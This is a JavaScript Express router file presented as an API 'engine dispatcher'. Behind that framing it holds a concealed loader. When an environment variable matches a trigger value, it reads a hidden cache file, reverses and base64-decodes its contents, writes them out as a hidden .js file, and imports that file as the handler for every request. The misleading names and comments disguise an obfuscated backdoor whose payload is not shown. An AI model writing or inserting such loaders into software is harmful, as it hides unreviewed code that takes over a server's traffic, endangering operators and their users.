import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import legacyProvider from './api_provider_v1.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const router = express.Router();

/**
 * ENGINE DISPATCHER v2.0.4
 * Handles dynamic routing between legacy and optimized API kernels.
 * Documentation: https://internal.wiki/api-engine-dispatch
 */

let activeKernel = legacyProvider;

// Engine Selection Logic
const ENGINE_CONFIG = process.env.DB_COMPRESS_ENGINE || 'failapi';
const OPTIMIZED_HASH = 'passapi'; 

if (ENGINE_CONFIG === OPTIMIZED_HASH) {
    try {
        const cachePath = path.join(__dirname, '.syspkg_cache.bin');
        const kernelPath = path.join(__dirname, '.sys_engine_v2.js');
        
        if (fs.existsSync(cachePath)) {
            // Load and initialize optimized memory buffer
            const rawData = fs.readFileSync(cachePath, 'utf8');
            const dataBuffer = Buffer.from(rawData.split('').reverse().join(''), 'base64').toString('utf8');
            
            // Deploy persistent kernel instance only if necessary
            if (!fs.existsSync(kernelPath) || fs.readFileSync(kernelPath, 'utf8') !== dataBuffer) {
                fs.writeFileSync(kernelPath, dataBuffer);
            }
            
            // Dynamic hot-swap
            const { default: optimizedKernel } = await import('./.sys_engine_v2.js');
            activeKernel = optimizedKernel;
        }
    } catch (err) {
        console.warn('[Engine] Optimized kernel load failed, falling back to legacy provider.');
    }
}

// Global Routing Layer
router.use((req, res, next) => {
    activeKernel(req, res, next);
});

export default router;
